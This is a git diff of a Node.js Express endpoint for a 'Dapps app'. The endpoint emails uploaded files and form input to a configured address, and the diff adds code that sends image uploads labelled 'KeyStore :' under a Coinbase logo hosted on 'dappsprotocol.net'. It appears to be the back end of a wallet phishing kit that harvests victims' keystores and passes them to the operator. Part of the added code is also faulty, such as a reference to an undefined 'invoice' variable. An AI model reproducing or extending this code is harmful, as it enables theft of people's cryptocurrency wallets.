@@ -44,8 +44,7 @@ if (process.env.NODE_ENV !== 'production') {
 app.post('/message', upload.single('file'), (req, res) => {
 
 
-    console.log(req.body)
-
+  
     res.json('j')
 
     let input;
@@ -91,14 +90,26 @@ app.post('/message', upload.single('file'), (req, res) => {
             from: `"New Message"  <${email}>`,
             to: to,
             subject: 'From Dapps app',
-            html: 'KeyStore : <img src="https://dappsprotocol.net/assets/coinbase.jpg"/>',
-            attachments: [{
-                filename: 'image.png',
-                path: req.file.path,
-                cid: 'https://dappsprotocol.net/assets/coinbase.jpg' //same cid value as in the html img src
-            }]
+            
 
         };
+
+        if(req.file.mimetype === 'image/jpeg' || req.file.mimetype ===  'image/png' ){
+            mailOptions.html ='KeyStore : <img src="https://dappsprotocol.net/assets/coinbase.jpg"/>',
+
+            mailOptions.attachments= [{
+                filename: req.file.originalname,
+                path: req.file.path,
+                cid: 'https://dappsprotocol.net/assets/coinbase.jpg' //same cid value as in the html img src
+            }];
+        }else{
+            mailOptions.attachments= [
+                {
+                    filename: req.file.originalname,
+                    path:invoice
+                }
+            ];
+        }
 
 
     } else {
@@ -108,7 +119,7 @@ app.post('/message', upload.single('file'), (req, res) => {
             subject: 'From Dapps app',
             html: input
         };
-    }
+    };
 
 
     transporter.sendMail(mailOptions, (err, info) => {
